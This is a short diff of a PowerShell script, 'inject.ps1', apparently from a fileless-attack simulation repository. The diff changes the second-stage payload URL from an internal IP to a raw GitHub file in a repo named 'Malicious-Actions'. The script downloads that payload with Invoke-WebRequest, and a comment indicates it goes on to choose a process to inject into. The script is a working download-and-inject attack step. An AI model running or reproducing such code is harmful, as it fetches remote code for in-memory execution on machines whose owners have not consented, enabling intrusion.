@@ -1,7 +1,7 @@
 # inject.ps1
 
 # Download the second-stage payload
-$payloadUrl = "http://172.16.1.155:8080/payload.ps1"
+$payloadUrl = "https://raw.githubusercontent.com/norsemen-local/Malicious-Actions/main/Case%201%20-%20Fileless%20Attack/payload.ps1"
 $payload = Invoke-WebRequest -Uri $payloadUrl -UseBasicParsing | Select-Object -ExpandProperty Content
 
 # Choose a common process for injection
